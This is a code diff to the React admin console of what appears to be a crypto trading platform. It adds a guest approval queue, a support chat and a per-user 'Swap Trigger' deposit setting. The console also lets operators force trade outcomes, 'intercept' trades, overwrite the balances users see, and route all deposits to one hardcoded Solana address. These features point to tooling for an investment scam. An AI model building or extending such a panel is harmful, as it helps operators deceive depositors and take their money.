@@ -5,7 +5,7 @@ import { authService, UserRecord } from '../services/authService';
 
 interface UserCardProps {
   user: any;
-  onSave: (user: any, balance: string) => void;
+  onSave: (user: any, balance: any) => void;
   savingId: string | null;
   savedId: string | null;
 }
@@ -18,6 +18,10 @@ const UserCard: React.FC<UserCardProps> = ({ user, onSave, savingId, savedId }) 
   const [localBal, setLocalBal] = useState(String(currentBalance));
   const [localDemoBal, setLocalDemoBal] = useState(String(currentDemoBalance));
   const [localProtocolBal, setLocalProtocolBal] = useState(String(currentProtocolBalance));
+  
+  const [depositCurrency, setDepositCurrency] = useState(user.pending_deposit_currency || 'BTC');
+  const [depositAmount, setDepositAmount] = useState(user.pending_deposit_amount || '0');
+  
   const protocolInputRef = useRef<HTMLInputElement>(null);
 
   // Keep local state in sync with external updates
@@ -30,10 +34,10 @@ const UserCard: React.FC<UserCardProps> = ({ user, onSave, savingId, savedId }) 
   const uid = user.id.toString();
   const lastSeenMs = user.last_seen ? Date.now() - new Date(user.last_seen).getTime() : Infinity;
   const isOnline = lastSeenMs < 90_000;
-  const hasActiveTrades = user.active_trades_count > 0;
 
   const handleUpdate = () => {
     const processAdditive = (val: string, current: string) => {
+      if (typeof val !== 'string') return val;
       if (val.startsWith('+')) {
         const add = parseFloat(val.substring(1).replace(/,/g, ''));
         return (parseFloat(current) + (isNaN(add) ? 0 : add)).toString();
@@ -48,7 +52,9 @@ const UserCard: React.FC<UserCardProps> = ({ user, onSave, savingId, savedId }) 
     onSave(user, { 
       trading_balance: processAdditive(localBal, String(currentBalance)), 
       demo_balance: processAdditive(localDemoBal, String(currentDemoBalance)), 
-      protocol_settlement_balance: processAdditive(localProtocolBal, String(currentProtocolBalance)) 
+      protocol_settlement_balance: processAdditive(localProtocolBal, String(currentProtocolBalance)),
+      pending_deposit_currency: depositCurrency,
+      pending_deposit_amount: depositAmount
     });
   };
 
@@ -57,7 +63,7 @@ const UserCard: React.FC<UserCardProps> = ({ user, onSave, savingId, savedId }) 
       <div className="flex justify-between items-start">
         <div className="flex items-center space-x-3">
           <div className={`w-3 h-3 rounded-full ${isOnline ? 'bg-emerald-500 animate-pulse' : 'bg-gray-700'}`}></div>
-          <div className="text-[10px] font-black uppercase tracking-tighter text-indigo-400">Node_{user.id}</div>
+          <div className="text-[10px] font-black uppercase tracking-tighter text-indigo-400">{user.email || `Node_${user.id}`}</div>
         </div>
         <div className="text-[8px] text-gray-500 uppercase font-black">{isOnline ? 'Active' : 'Standby'}</div>
       </div>
@@ -93,6 +99,26 @@ const UserCard: React.FC<UserCardProps> = ({ user, onSave, savingId, savedId }) 
       </div>
 
       <div className="space-y-3">
+        <div className="p-3 bg-indigo-900/10 rounded-xl border border-indigo-500/20 space-y-2">
+            <div className="text-[8px] text-indigo-400 uppercase font-black">Set User Deposit (Swap Trigger)</div>
+            <div className="flex gap-2">
+                <input 
+                    type="text" 
+                    placeholder="BTC" 
+                    value={depositCurrency}
+                    onChange={(e) => setDepositCurrency(e.target.value)}
+                    className="w-16 bg-[#0B0E11] border border-[#2B3139] rounded-lg px-2 py-1 text-[10px] font-mono text-white" 
+                />
+                <input 
+                    type="number" 
+                    placeholder="Amount" 
+                    value={depositAmount}
+                    onChange={(e) => setDepositAmount(e.target.value)}
+                    className="flex-1 bg-[#0B0E11] border border-[#2B3139] rounded-lg px-2 py-1 text-[10px] font-mono text-white" 
+                />
+            </div>
+        </div>
+
         <div className="space-y-1">
             <div className="text-[8px] text-gray-500 uppercase font-black pl-1">Modify Protocol Settlement</div>
             <input
@@ -146,7 +172,7 @@ interface AdminDeskProps {
 }
 
 const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTrades: propsActiveTrades, onForceOutcome, onUpdateWallet }) => {
-  const [activeTab, setActiveTab] = useState<'intercept' | 'withdrawals' | 'users' | 'deposit' | 'config'>('users');
+  const [activeTab, setActiveTab] = useState<'intercept' | 'withdrawals' | 'users' | 'guests' | 'support' | 'config'>('users');
   const [remoteUsers, setRemoteUsers] = useState<Record<string, UserRecord>>({});
   const [dbUsers, setDbUsers] = useState<any[]>([]);
   const [activeTrades, setActiveTrades] = useState<any[]>([]);
@@ -163,6 +189,10 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
   const [configSaved, setConfigSaved] = useState(false);
   const [depositInput, setDepositInput] = useState('6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw');
   const [sysStatus, setSysStatus] = useState<any>(null);
+
+  const [supportTickets, setSupportTickets] = useState<any[]>([]);
+  const [activeTicket, setActiveTicket] = useState<any>(null);
+  const [adminReply, setAdminReply] = useState('');
 
   // Load current config and health on mount
   useEffect(() => {
@@ -196,18 +226,28 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
     } catch (e) { console.error('Failed to fetch active trades', e); }
   };
 
+  const fetchDbUsers = async () => {
+    try {
+      const res = await fetch('/api/admin/users');
+      if (res.ok) setDbUsers(await res.json());
+    } catch (e) { console.error('Failed to fetch users', e); }
+  };
+
+  const fetchSupport = async () => {
+    try {
+      const res = await fetch('/api/admin/support/tickets');
+      if (res.ok) setSupportTickets(await res.json());
+    } catch (e) { console.error('Failed to fetch support tickets', e); }
+  };
+
   useEffect(() => {
-    const fetchDbUsers = async () => {
-      try {
-        const res = await fetch('/api/admin/users');
-        if (res.ok) setDbUsers(await res.json());
-      } catch (e) { console.error('Failed to fetch users', e); }
-    };
     fetchDbUsers();
     fetchActiveTrades();
+    fetchSupport();
     const interval = setInterval(() => {
       fetchDbUsers();
       fetchActiveTrades();
+      fetchSupport();
     }, 5000);
     return () => clearInterval(interval);
   }, []);
@@ -254,7 +294,7 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
     }
   };
 
-  const handleSaveBalance = async (user: any, balances: { trading_balance: string, demo_balance: string, protocol_settlement_balance: string }) => {
+  const handleSaveBalance = async (user: any, balances: any) => {
     setSavingId(user.id.toString());
     try {
       await fetch('/api/admin/users/update', {
@@ -267,8 +307,19 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
           protocol_settlement_balance: parseFloat(balances.protocol_settlement_balance) || 0
         })
       });
-      const updated = await fetch('/api/admin/users');
-      if (updated.ok) setDbUsers(await updated.json());
+      
+      // Update deposit info
+      await fetch('/api/admin/deposit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+              walletAddress: user.wallet_address,
+              currency: balances.pending_deposit_currency,
+              amount: balances.pending_deposit_amount
+          })
+      });
+
+      fetchDbUsers();
       setSavedId(user.id.toString());
       setTimeout(() => setSavedId(null), 2000);
     } catch (e) {
@@ -276,6 +327,45 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
     } finally {
       setSavingId(null);
     }
+  };
+
+  const handleApproveUser = async (userId: number) => {
+    try {
+      await fetch('/api/admin/users/approve', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId })
+      });
+      fetchDbUsers();
+    } catch (e) { console.error('Approve failed', e); }
+  };
+
+  const handleRejectUser = async (userId: number) => {
+    try {
+      await fetch('/api/admin/users/reject', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId })
+      });
+      fetchDbUsers();
+    } catch (e) { console.error('Reject failed', e); }
+  };
+
+  const handleSupportReply = async () => {
+    if (!activeTicket || !adminReply) return;
+    try {
+      await fetch('/api/support/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          address: activeTicket.wallet_address, 
+          message: adminReply, 
+          sender: 'admin' 
+        })
+      });
+      setAdminReply('');
+      fetchSupport();
+    } catch (e) { console.error('Reply failed', e); }
   };
 
   const handleApproveWithdrawal = async (requestId: number) => {
@@ -335,6 +425,9 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
     }
   };
 
+  const guestUsers = dbUsers.filter(u => u.status === 'guest');
+  const approvedUsers = dbUsers.filter(u => u.status !== 'guest');
+
   return (
     <div className="fixed inset-0 z-[1000] bg-[#0B0E11] text-gray-200 font-mono flex flex-col border-4 border-indigo-900/20">
       <div className="flex items-center justify-between p-6 bg-[#181C25] border-b border-[#2B3139]">
@@ -353,9 +446,11 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
           </div>
           <nav className="flex space-x-1">
             {[
-              { id: 'users', label: 'User Nodes' },
+              { id: 'users', label: 'Nodes' },
+              { id: 'guests', label: `Guests (${guestUsers.length})` },
               { id: 'intercept', label: 'Intercept' },
               { id: 'withdrawals', label: 'Withdrawals' },
+              { id: 'support', label: 'Support' },
               { id: 'config', label: 'Config' }
             ].map(tab => (
               <button
@@ -378,32 +473,12 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
           <div className="space-y-6">
             <div className="flex justify-between items-center px-4">
               <div>
-                <h2 className="text-lg font-black uppercase italic text-indigo-400">Registry — User Nodes</h2>
-                <p className="text-[9px] text-gray-500 font-black uppercase tracking-widest mt-1">Address-based identifying system (No nicknames)</p>
-              </div>
-              <div className="flex items-center space-x-4">
-                <span className="text-[10px] text-gray-500 font-black uppercase">{dbUsers.length} REGISTERED</span>
-                <button
-                  onClick={async () => {
-                    const res = await fetch('/api/admin/users');
-                    if (res.ok) setDbUsers(await res.json());
-                  }}
-                  className="px-3 py-1.5 bg-[#1E2329] border border-[#2B3139] rounded-lg text-[9px] font-black uppercase text-indigo-400 hover:text-white transition-all"
-                >Force Refresh</button>
+                <h2 className="text-lg font-black uppercase italic text-indigo-400">Registry — Active Nodes</h2>
+                <p className="text-[9px] text-gray-500 font-black uppercase tracking-widest mt-1">Institutional accounts with protocol clearance.</p>
               </div>
             </div>
-
-            {dbUsers.length === 0 && (
-              <div className="bg-[#181C25] border-2 border-dashed border-[#2B3139] rounded-[40px] py-32 text-center space-y-4">
-                <div className="text-4xl text-gray-800 font-black uppercase italic tracking-tighter opacity-20">Registry Empty</div>
-                <p className="text-[10px] text-gray-600 font-black uppercase tracking-[0.3em] max-w-sm mx-auto leading-relaxed">
-                  Waiting for user connections. Ensure your Supabase database is reachable and the Sync Node button is used on the client.
-                </p>
-              </div>
-            )}
-
             <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 px-2">
-              {dbUsers.map(user => (
+              {approvedUsers.map(user => (
                 <UserCard
                   key={user.id}
                   user={user}
@@ -412,6 +487,40 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
                   savedId={savedId}
                 />
               ))}
+            </div>
+          </div>
+        )}
+
+        {/* ── GUEST USERS ────────────────────────────────────────── */}
+        {activeTab === 'guests' && (
+          <div className="space-y-6">
+            <div className="flex justify-between items-center px-4">
+              <h2 className="text-lg font-black uppercase italic text-amber-500">Account Approval Queue</h2>
+            </div>
+            <div className="bg-[#181C25] border border-[#2B3139] rounded-[32px] overflow-hidden">
+                <table className="w-full text-left">
+                    <thead className="bg-[#0B0E11] text-[9px] text-gray-500 uppercase font-black border-b border-[#2B3139]">
+                        <tr>
+                            <th className="px-8 py-4">ID</th>
+                            <th className="px-8 py-4">Email</th>
+                            <th className="px-8 py-4">Status</th>
+                            <th className="px-8 py-4 text-right">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody className="divide-y divide-[#2B3139]">
+                        {guestUsers.map(u => (
+                            <tr key={u.id}>
+                                <td className="px-8 py-6 font-mono text-indigo-400">{u.id}</td>
+                                <td className="px-8 py-6 font-bold">{u.email}</td>
+                                <td className="px-8 py-6"><span className="bg-amber-900/20 text-amber-500 px-2 py-1 rounded text-[10px] font-black uppercase">Guest</span></td>
+                                <td className="px-8 py-6 text-right space-x-2">
+                                    <button onClick={() => handleApproveUser(u.id)} className="bg-emerald-600 hover:bg-emerald-500 text-white px-4 py-2 rounded-xl text-[10px] font-black uppercase">Approve</button>
+                                    <button onClick={() => handleRejectUser(u.id)} className="bg-rose-900/20 text-rose-500 border border-rose-500/20 px-4 py-2 rounded-xl text-[10px] font-black uppercase">Reject</button>
+                                </td>
+                            </tr>
+                        ))}
+                    </tbody>
+                </table>
             </div>
           </div>
         )}
@@ -477,15 +586,6 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
                 <h2 className="text-lg font-black uppercase italic text-amber-500">Withdrawal Queue</h2>
                 <p className="text-[9px] text-gray-500 font-black uppercase tracking-widest mt-1">Marking 'Done' will update the protocol settlement balance manually.</p>
               </div>
-              <div className="flex items-center space-x-4">
-                <span className="text-[10px] text-amber-400 font-black">
-                  {withdrawalRequests.filter(r => r.status === 'pending').length} PENDING
-                </span>
-                <button
-                  onClick={fetchWithdrawalRequests}
-                  className="px-3 py-1.5 bg-[#1E2329] border border-[#2B3139] rounded-lg text-[9px] font-black uppercase text-gray-400 hover:text-white transition-all"
-                >Refresh</button>
-              </div>
             </div>
 
             <div className="bg-[#181C25] border border-[#2B3139] rounded-[32px] overflow-hidden">
@@ -540,18 +640,11 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
                               }
                             </button>
                           </div>
-                          {wr.tx_signature && (
-                            <div className="text-[8px] text-emerald-500 font-mono mt-1 truncate max-w-[160px]">tx: {wr.tx_signature.slice(0, 20)}…</div>
-                          )}
-                          {wr.admin_note && isFailed && (
-                            <div className="text-[8px] text-rose-400 mt-1 truncate max-w-[160px]">{wr.admin_note}</div>
-                          )}
                         </td>
                         <td className="px-6 py-5">
                           <div className={`text-sm font-black font-mono ${hasFunds ? 'text-emerald-400' : 'text-rose-400'}`}>
                             {balance.toLocaleString(undefined, { minimumFractionDigits: 4 })} {wr.asset}
                           </div>
-                          {!hasFunds && <div className="text-[8px] text-rose-500 font-black uppercase">Insufficient</div>}
                         </td>
                         <td className="px-6 py-5">
                           <span className={`text-[9px] font-black uppercase px-3 py-1.5 rounded-xl border ${
@@ -562,41 +655,19 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
                           }`}>{wr.status}</span>
                         </td>
                         <td className="px-6 py-5 text-right">
-                          {rowError && (
-                            <div className="text-[8px] text-rose-400 font-bold mb-2 max-w-[160px] ml-auto text-right leading-tight">{rowError}</div>
-                          )}
                           {isPending && (
                             <div className="flex justify-end space-x-2">
                               <button
                                 onClick={() => handleApproveWithdrawal(wr.id)}
                                 disabled={isApproving || isRejecting || !hasFunds}
-                                className={`flex items-center space-x-1.5 px-4 py-2 rounded-lg text-[9px] font-black uppercase transition-all disabled:opacity-40 ${
-                                  isApproving
-                                    ? 'bg-emerald-600 text-white'
-                                    : 'bg-emerald-900/20 text-emerald-500 border border-emerald-500/20 hover:bg-emerald-600 hover:text-white'
-                                }`}
-                              >
-                                {isApproving
-                                  ? <><div className="w-3 h-3 border-2 border-white border-t-transparent rounded-full animate-spin" /><span>Processing…</span></>
-                                  : <span>Done</span>
-                                }
-                              </button>
+                                className="bg-emerald-600 hover:bg-emerald-500 text-white px-4 py-2 rounded-xl text-[10px] font-black uppercase"
+                              >Done</button>
                               <button
                                 onClick={() => handleRejectWithdrawal(wr.id)}
                                 disabled={isApproving || isRejecting}
-                                className="px-3 py-2 rounded-lg text-[9px] font-black uppercase text-rose-500 border border-rose-500/20 bg-rose-900/10 hover:bg-rose-600 hover:text-white transition-all disabled:opacity-40"
-                              >
-                                {isRejecting ? '…' : 'Reject'}
-                              </button>
+                                className="bg-rose-900/20 text-rose-500 border border-rose-500/20 px-4 py-2 rounded-xl text-[10px] font-black uppercase"
+                              >Reject</button>
                             </div>
-                          )}
-                          {isApproved && <span className="text-[9px] text-emerald-500 font-black uppercase">Completed ✓</span>}
-                          {isRejected && <span className="text-[9px] text-gray-500 font-black uppercase">Rejected</span>}
-                          {isFailed   && (
-                            <button
-                              onClick={() => handleApproveWithdrawal(wr.id)}
-                              className="px-3 py-2 rounded-lg text-[9px] font-black uppercase text-amber-500 border border-amber-500/20 bg-amber-900/10 hover:bg-amber-600 hover:text-white transition-all"
-                            >Retry</button>
                           )}
                         </td>
                       </tr>
@@ -611,52 +682,84 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
           </div>
         )}
 
+        {/* ── SUPPORT CHAT ───────────────────────────────────────── */}
+        {activeTab === 'support' && (
+            <div className="flex gap-6 h-[600px]">
+                <div className="w-80 bg-[#181C25] border border-[#2B3139] rounded-[32px] overflow-hidden flex flex-col">
+                    <div className="p-4 border-b border-[#2B3139] bg-[#1E2329] font-black text-[10px] uppercase text-indigo-400">Support Tickets</div>
+                    <div className="flex-1 overflow-y-auto">
+                        {supportTickets.map(t => (
+                            <button 
+                                key={t.id} 
+                                onClick={() => setActiveTicket(t)}
+                                className={`w-full text-left p-4 border-b border-[#2B3139] hover:bg-[#2B3139] transition-all ${activeTicket?.id === t.id ? 'bg-[#2B3139] border-l-4 border-l-indigo-500' : ''}`}
+                            >
+                                <div className="text-[10px] font-black text-gray-200 truncate">{t.wallet_address}</div>
+                                <div className="text-[8px] text-gray-500 uppercase mt-1">Last update: {new Date(t.updated_at).toLocaleTimeString()}</div>
+                            </button>
+                        ))}
+                    </div>
+                </div>
+                <div className="flex-1 bg-[#181C25] border border-[#2B3139] rounded-[32px] overflow-hidden flex flex-col">
+                    {activeTicket ? (
+                        <>
+                            <div className="p-4 border-b border-[#2B3139] bg-[#1E2329] flex justify-between items-center">
+                                <span className="text-[10px] font-black uppercase text-indigo-400">Chat with {activeTicket.wallet_address.slice(0, 16)}...</span>
+                            </div>
+                            <div className="flex-1 p-6 overflow-y-auto space-y-4">
+                                {activeTicket.messages.map((m: any, i: number) => (
+                                    <div key={i} className={`flex ${m.sender === 'admin' ? 'justify-end' : 'justify-start'}`}>
+                                        <div className={`max-w-[80%] p-4 rounded-2xl text-xs ${m.sender === 'admin' ? 'bg-indigo-600 text-white' : 'bg-[#0B0E11] border border-[#2B3139] text-gray-300'}`}>
+                                            {m.text}
+                                        </div>
+                                    </div>
+                                ))}
+                            </div>
+                            <div className="p-4 border-t border-[#2B3139] bg-[#1E2329] flex gap-3">
+                                <input 
+                                    type="text" 
+                                    value={adminReply}
+                                    onChange={(e) => setAdminReply(e.target.value)}
+                                    placeholder="Type protocol response..."
+                                    className="flex-1 bg-[#0B0E11] border border-[#2B3139] rounded-xl px-4 py-2 text-xs outline-none focus:border-indigo-500"
+                                />
+                                <button onClick={handleSupportReply} className="bg-indigo-600 hover:bg-indigo-500 text-white px-6 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest">Send</button>
+                            </div>
+                        </>
+                    ) : (
+                        <div className="flex-1 flex items-center justify-center text-gray-600 uppercase font-black tracking-widest text-[10px]">Select a ticket to begin interaction</div>
+                    )}
+                </div>
+            </div>
+        )}
+
         {/* ── CONFIG ─────────────────────────────────────────────── */}
         {activeTab === 'config' && (
           <div className="space-y-6 max-w-2xl">
             <h2 className="text-lg font-black uppercase italic text-indigo-400 px-4">Protocol Overrides</h2>
             <div className="bg-[#181C25] border border-[#2B3139] p-8 rounded-[40px] space-y-8">
-
-              {/* Deposit Address */}
               <div className="space-y-3">
                 <div className="flex items-center justify-between">
-                  <label className="text-[10px] text-gray-400 font-black uppercase tracking-widest">
-                    Master Deposit Address <span className="text-indigo-400">(Global)</span>
-                  </label>
-                  <span className="text-[8px] text-emerald-500 font-black uppercase">✎ Editable</span>
+                  <label className="text-[10px] text-gray-400 font-black uppercase tracking-widest">Master Deposit Address</label>
                 </div>
                 <input
                   type="text"
                   value={depositInput}
                   onChange={e => setDepositInput(e.target.value)}
-                  placeholder="Solana Address"
-                  className="w-full bg-[#0B0E11] border-2 border-indigo-500/40 hover:border-indigo-500/70 focus:border-indigo-500 rounded-2xl p-5 text-base text-indigo-400 font-mono outline-none transition-colors cursor-text"
+                  className="w-full bg-[#0B0E11] border-2 border-indigo-500/40 rounded-2xl p-5 text-base text-indigo-400 font-mono outline-none"
                 />
               </div>
-
-              {/* Save button */}
               <button
                 onClick={handleSaveConfig}
                 disabled={configSaving}
-                className={`w-full py-5 font-black uppercase tracking-widest rounded-2xl shadow-xl transition-all text-sm ${
-                  configSaved
-                    ? 'bg-emerald-600 text-white'
-                    : 'bg-indigo-600 hover:bg-indigo-500 text-white'
-                } disabled:opacity-60`}
+                className="w-full py-5 font-black uppercase tracking-widest rounded-2xl bg-indigo-600 text-white"
               >
-                {configSaving ? 'Saving...' : configSaved ? '✓ Changes Saved Globally' : 'Save & Broadcast Changes'}
+                {configSaving ? 'Saving...' : 'Save & Broadcast Changes'}
               </button>
-
-              <div className="p-4 bg-indigo-900/10 rounded-2xl border border-indigo-500/20 text-[9px] text-indigo-400 font-bold uppercase tracking-widest leading-relaxed">
-                Changes broadcast to all connected users within 5 seconds worldwide.
-              </div>
             </div>
           </div>
         )}
-      </div>
 
-      <div className="p-4 bg-rose-900/10 border-t border-rose-500/20 text-[9px] text-rose-500 font-bold uppercase tracking-widest text-center">
-        Admin Access — Root Level — All Actions Are Final
       </div>
     </div>
   );
